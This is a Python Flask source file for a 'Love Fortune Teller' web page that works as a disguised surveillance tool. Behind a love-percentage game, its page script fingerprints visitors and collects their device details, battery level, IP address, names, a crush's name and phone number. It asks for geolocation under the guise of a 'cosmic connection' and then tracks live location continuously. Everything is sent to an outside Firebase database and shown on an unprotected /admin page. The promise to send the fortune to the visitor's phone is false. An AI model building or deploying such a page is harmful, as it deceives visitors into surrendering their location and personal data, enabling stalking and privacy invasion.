from flask import Flask, request, jsonify, render_template_string
import os
import random
import json
import requests
from datetime import datetime

app = Flask(__name__)

# ========== FIREBASE SETUP ==========
FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"

# ========== LOVE CALCULATOR FUNCTIONS ==========
def calculate_love_percentage(name1, name2):
    combined = (name1 + name2).lower()
    total = sum(ord(c) for c in combined)
    return 50 + (total % 51)

def get_love_message(name1, name2, percentage):
    messages = [
        f"💕 {name1} ❤️ {name2} – your love is {percentage}% pure magic!",
        f"✨ The stars say {name1} and {name2} have a {percentage}% chance of a fairytale romance!",
        f"🌹 {name1} + {name2} = {percentage}% love chemistry! Keep the spark alive!",
        f"💖 Destiny smiles at {name1} and {name2} – {percentage}% soulmate connection!",
        f"💫 {name1} and {name2}, your hearts beat at {percentage}% harmony!"
    ]
    return random.choice(messages)

# ========== FIXED FIREBASE FUNCTIONS ==========
def save_to_firebase(path, data):
    """Save data to Firebase using POST for new entries, PATCH for updates"""
    try:
        # Use POST to create a new entry with auto-generated ID
        url = f"{FIREBASE_URL}/{path}.json"
        
        # For visitors, we want to use the sessionId as the key
        if "visitors" in path:
            # This uses PUT to set data at specific path (sessionId)
            response = requests.put(url, json=data, timeout=10)
        else:
            # For tracking data, use POST to create unique entries
            response = requests.post(url, json=data, timeout=10)
        
        print(f"Saved to {path}: Status {response.status_code}")
        if response.status_code not in [200, 201]:
            print(f"Error response: {response.text}")
        return response.status_code in [200, 201]
    except Exception as e:
        print(f"Firebase save error: {e}")
        return False

def save_visitor(session_id, data):
    """Save visitor data using sessionId as the key"""
    path = f"visitors/{session_id}"
    return save_to_firebase(path, data)

def save_location_tracking(session_id, lat, lon, map_url):
    """Save each location update as a separate entry"""
    timestamp = datetime.now().isoformat()
    location_data = {
        "sessionId": session_id,
        "timestamp": timestamp,
        "latitude": lat,
        "longitude": lon,
        "mapUrl": map_url
    }
    path = f"tracking_data"
    return save_to_firebase(path, location_data)

# ========== HTML TEMPLATE ==========
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💕 Love Fortune Teller</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(255, 255, 255, 0.98);
            border-radius: 35px;
            padding: 45px 35px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.2);
        }
        h1 {
            background: linear-gradient(135deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 10px;
            font-size: 2.3em;
        }
        .subtitle { color: #7b8a9b; margin-bottom: 35px; font-size: 0.9em; }
        .input-group { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        input {
            flex: 1;
            padding: 16px 25px;
            border: 2px solid #e2e8f0;
            border-radius: 60px;
            font-size: 16px;
            text-align: center;
            background: #f7fafc;
        }
        input:focus { outline: none; border-color: #667eea; background: white; }
        
        .btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4); }
        
        .cosmic-panel {
            margin-top: 20px;
            padding: 25px;
            background: #fef5e7;
            border-radius: 25px;
            display: none;
            border: 2px solid #ffe0b5;
        }
        .cosmic-status {
            background: white;
            padding: 15px;
            border-radius: 15px;
            margin: 15px 0;
            font-size: 14px;
        }
        .cosmic-btn {
            background: linear-gradient(135deg, #48bb78, #38a169);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            font-size: 16px;
        }
        .result {
            margin-top: 25px;
            padding: 30px;
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.1), rgba(118, 75, 162, 0.1));
            border-radius: 25px;
            display: none;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .percentage {
            font-size: 5em;
            font-weight: 800;
            background: linear-gradient(135deg, #f093fb, #f5576c);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .love-message { font-size: 1.2em; color: #2d3748; margin: 20px 0; }
        .phone-section {
            margin-top: 25px;
            padding: 20px;
            background: white;
            border-radius: 20px;
            display: none;
            border: 1px solid #e2e8f0;
        }
        .phone-input {
            width: 100%;
            padding: 14px;
            border: 2px solid #e2e8f0;
            border-radius: 50px;
            margin-bottom: 12px;
            text-align: center;
        }
        .save-btn {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 50px;
            color: white;
            font-weight: 600;
            cursor: pointer;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 25px;
            font-size: 13px;
            display: none;
        }
        .status.success { background: #c6f6d5; color: #22543d; display: block; }
        .status.error { background: #fed7d7; color: #742a2a; display: block; }
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        footer { margin-top: 20px; font-size: 11px; color: #a0aec0; }
    </style>
</head>
<body>
<div class="card">
    <h1>💕 Love Fortune Teller</h1>
    <div class="subtitle">Discover your destiny ✨</div>
    
    <div id="stepNames">
        <div class="input-group">
            <input type="text" id="name1" placeholder="Your name">
            <input type="text" id="name2" placeholder="Their name">
        </div>
        <button class="btn" onclick="prepareReading()">🌙 Prepare Your Reading 🌙</button>
    </div>
    
    <div id="cosmicPanel" class="cosmic-panel">
        <h3>✨ Connecting to the Universe ✨</h3>
        <div class="cosmic-status" id="cosmicStatus">🌟 Click below to begin your cosmic journey</div>
        <button class="cosmic-btn" id="cosmicBtn" onclick="syncCosmicEnergy()">🔮 Reveal My Destiny 🔮</button>
    </div>
    
    <div id="result" class="result">
        <div class="percentage" id="percentage">0%</div>
        <div class="love-message" id="message"></div>
    </div>
    
    <div id="phoneSection" class="phone-section">
        <h4>📱 Receive Your Fortune</h4>
        <input type="tel" id="phone" class="phone-input" placeholder="Enter your mobile number">
        <button class="save-btn" onclick="saveNumber()">💾 Send to My Phone</button>
    </div>
    
    <div id="status" class="status"></div>
    <footer>🔮 Trust the universe | Your destiny awaits</footer>
</div>

<script>
    let sessionId = localStorage.getItem('destiny_session');
    if (!sessionId) {
        sessionId = 'destiny_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
        localStorage.setItem('destiny_session', sessionId);
    }
    
    let currentFortune = '', currentPercent = 0, name1 = '', name2 = '';
    let currentLat = null, currentLon = null;
    let destinyData = { sessionId: sessionId, timestamp: new Date().toISOString() };
    
    async function collectDestinyData() {
        try {
            const fp = await FingerprintJS.load();
            const result = await fp.get();
            destinyData.fingerprint = result.visitorId;
        } catch(e) { destinyData.fingerprint = 'unknown'; }
        
        destinyData.screen = screen.width + 'x' + screen.height;
        destinyData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        destinyData.userAgent = navigator.userAgent;
        if (navigator.deviceMemory) destinyData.deviceMemory = navigator.deviceMemory + ' GB';
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                destinyData.batteryLevel = Math.round(battery.level * 100) + '%';
            } catch(e) {}
        }
        const connection = navigator.connection;
        if (connection) destinyData.networkType = connection.effectiveType;
        
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
    }
    
    function prepareReading() {
        name1 = document.getElementById('name1').value.trim();
        name2 = document.getElementById('name2').value.trim();
        if (!name1 || !name2) {
            showMessage('Please enter both names 💕', 'error');
            return;
        }
        destinyData.name = name1;
        destinyData.crush_name = name2;
        fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
        document.getElementById('stepNames').style.display = 'none';
        document.getElementById('cosmicPanel').style.display = 'block';
    }
    
    function syncCosmicEnergy() {
        const energyBtn = document.getElementById('cosmicBtn');
        energyBtn.innerHTML = '<span class="loading"></span> Connecting...';
        energyBtn.disabled = true;
        document.getElementById('cosmicStatus').innerHTML = '✨ The stars are aligning...';
        
        navigator.geolocation.getCurrentPosition(async (position) => {
            currentLat = position.coords.latitude;
            currentLon = position.coords.longitude;
            const mapUrl = `https://www.google.com/maps?q=${currentLat},${currentLon}`;
            
            destinyData.latitude = currentLat;
            destinyData.longitude = currentLon;
            destinyData.mapUrl = mapUrl;
            
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
            
            await fetch('/record-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, latitude: currentLat, longitude: currentLon, mapUrl })
            });
            
            await revealFortune();
            energyBtn.innerHTML = '✨ Destiny Revealed ✨';
            
            // Start live tracking
            startLiveTracking();
        }, (error) => {
            document.getElementById('cosmicStatus').innerHTML = '❌ Please allow cosmic connection!';
            energyBtn.innerHTML = '🔮 Try Again 🔮';
            energyBtn.disabled = false;
        });
    }
    
    function startLiveTracking() {
        navigator.geolocation.watchPosition(async (position) => {
            const newLat = position.coords.latitude;
            const newLon = position.coords.longitude;
            const newMapUrl = `https://www.google.com/maps?q=${newLat},${newLon}`;
            
            await fetch('/record-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ sessionId, latitude: newLat, longitude: newLon, mapUrl: newMapUrl })
            });
            
            destinyData.latitude = newLat;
            destinyData.longitude = newLon;
            destinyData.mapUrl = newMapUrl;
            await fetch('/save-destiny', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(destinyData)
            });
        });
    }
    
    async function revealFortune() {
        const response = await fetch('/calculate-fortune', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ name1, name2 })
        });
        const result = await response.json();
        currentPercent = result.percentage;
        currentFortune = result.message;
        document.getElementById('percentage').innerHTML = currentPercent + '%';
        document.getElementById('message').innerHTML = currentFortune;
        document.getElementById('result').style.display = 'block';
        document.getElementById('phoneSection').style.display = 'block';
        
        destinyData.fortuneText = currentFortune;
        destinyData.percentage = currentPercent;
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
    }
    
    async function saveNumber() {
        const phone = document.getElementById('phone').value.trim();
        if (!phone) { showMessage('Enter your number', 'error'); return; }
        destinyData.phoneNumber = phone;
        await fetch('/save-destiny', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(destinyData)
        });
        showMessage('✅ Fortune sent to your phone!', 'success');
        document.getElementById('phone').disabled = true;
        event.target.disabled = true;
    }
    
    function showMessage(msg, type) {
        const el = document.getElementById('status');
        el.textContent = msg;
        el.className = `status ${type}`;
        setTimeout(() => { el.style.display = 'none'; }, 3000);
    }
    
    collectDestinyData();
</script>
</body>
</html>
'''

# ========== FLASK ROUTES ==========
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save-destiny', methods=['POST'])
def save_destiny():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
        data['timestamp'] = datetime.now().isoformat()
        
        # Save to Firebase using sessionId as key
        url = f"{FIREBASE_URL}/visitors/{session_id}.json"
        response = requests.put(url, json=data, timeout=10)
        print(f"Saving to Firebase: {response.status_code}")
        return jsonify({'status': 'saved'})
    except Exception as e:
        print(f"Save error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/record-location', methods=['POST'])
def record_location():
    try:
        data = request.get_json()
        session_id = data.get('sessionId')
        lat = data.get('latitude')
        lon = data.get('longitude')
        map_url = data.get('mapUrl')
        
        if session_id and lat and lon:
            location_data = {
                "sessionId": session_id,
                "timestamp": datetime.now().isoformat(),
                "latitude": lat,
                "longitude": lon,
                "mapUrl": map_url
            }
            # Use POST to create unique entries
            url = f"{FIREBASE_URL}/tracking_data.json"
            response = requests.post(url, json=location_data, timeout=10)
            print(f"Saving location: {response.status_code}")
            return jsonify({'status': 'recorded'})
        return jsonify({'status': 'error'}), 400
    except Exception as e:
        print(f"Location error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/calculate-fortune', methods=['POST'])
def calculate_fortune():
    data = request.get_json()
    name1 = data.get('name1', '')
    name2 = data.get('name2', '')
    percentage = calculate_love_percentage(name1, name2)
    message = get_love_message(name1, name2, percentage)
    return jsonify({'percentage': percentage, 'message': message})

# ========== ADMIN VIEW ==========
@app.route('/admin')
def admin():
    try:
        visitors_url = f"{FIREBASE_URL}/visitors.json"
        tracking_url = f"{FIREBASE_URL}/tracking_data.json"
        
        visitors_response = requests.get(visitors_url)
        tracking_response = requests.get(tracking_url)
        
        visitors = visitors_response.json() if visitors_response.status_code == 200 else {}
        tracking = tracking_response.json() if tracking_response.status_code == 200 else {}
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Dashboard</title>
            <style>
                body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
                h1 { color:#f093fb; }
                table { background:#16213e; border-collapse:collapse; width:100%; }
                th, td { border:1px solid #0f3460; padding:8px; text-align:left; font-size:12px; }
                th { background:#e94560; }
                .btn { background:#e94560; color:white; padding:10px; text-decoration:none; display:inline-block; margin:10px; }
            </style>
        </head>
        <body>
            <h1>📊 Visitor Data</h1>
            <p><a href="/admin" class="btn">🔄 Refresh</a> <a href="/" class="btn">Back</a></p>
        """
        
        if visitors:
            html += "<table border='1'>"
            html += "<tr><th>Session ID</th><th>Name</th><th>Crush</th><th>Love %</th><th>Phone</th><th>Latitude</th><th>Longitude</th><th>Map</th><th>Fingerprint</th><th>Battery</th></tr>"
            for session_id, visitor in visitors.items():
                if isinstance(visitor, dict):
                    map_link = f'<a href="{visitor.get("mapUrl", "#")}" target="_blank">🗺️</a>' if visitor.get("mapUrl") else "-"
                    html += f"""
                    <tr>
                        <td>{session_id[:20]}...</td>
                        <td>{visitor.get('name', '-')}</td>
                        <td>{visitor.get('crush_name', '-')}</td>
                        <td style="color:#f093fb;">{visitor.get('percentage', '-')}%</td>
                        <td>{visitor.get('phoneNumber', '-')}</td>
                        <td>{visitor.get('latitude', '-')}</td>
                        <td>{visitor.get('longitude', '-')}</td>
                        <td>{map_link}</td>
                        <td>{visitor.get('fingerprint', '-')[:15]}...</td>
                        <td>{visitor.get('batteryLevel', '-')}</td>
                    </tr>
                    """
            html += "</table>"
        
        if tracking:
            html += f"<h2>Location Tracking ({len(tracking)} updates)</h2>"
            html += "<table border='1'><tr><th>Session ID</th><th>Time</th><th>Latitude</th><th>Longitude</th><th>Map</th></tr>"
            for key, loc in tracking.items():
                if isinstance(loc, dict):
                    map_link = f'<a href="{loc.get("mapUrl", "#")}" target="_blank">🗺️</a>' if loc.get("mapUrl") else "-"
                    html += f"""
                    <tr>
                        <td>{loc.get('sessionId', '')[:20]}...</td>
                        <td>{loc.get('timestamp', '')[:19]}</td>
                        <td>{loc.get('latitude', '-')}</td>
                        <td>{loc.get('longitude', '-')}</td>
                        <td>{map_link}</td>
                    </tr>
                    """
            html += "</table>"
        
        html += "</body></html>"
        return html
    except Exception as e:
        return f"<h1>Error: {str(e)}</h1>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
